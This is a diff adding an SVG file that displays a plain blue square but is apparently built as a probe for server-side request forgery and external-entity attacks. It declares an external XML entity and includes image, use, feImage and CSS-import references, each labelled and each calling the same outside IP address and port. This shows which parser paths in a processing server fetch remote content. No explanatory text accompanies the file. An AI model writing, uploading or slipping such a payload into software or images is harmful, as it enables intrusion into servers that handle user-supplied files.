@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://167.99.108.92:19443/xxe">]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="64" height="64">
+ <rect width="64" height="64" fill="#09f"/>
+ <image xlink:href="http://167.99.108.92:19443/a-xlink" width="30" height="30"/>
+ <image href="http://167.99.108.92:19443/b-href" x="30" width="30" height="30"/>
+ <use xlink:href="http://167.99.108.92:19443/c-use"/>
+ <feImage xlink:href="http://167.99.108.92:19443/d-feimage"/>
+ <text x="2" y="60" font-size="6">&xxe;</text>
+ <style>@import url("http://167.99.108.92:19443/e-cssimport");</style>
+</svg>
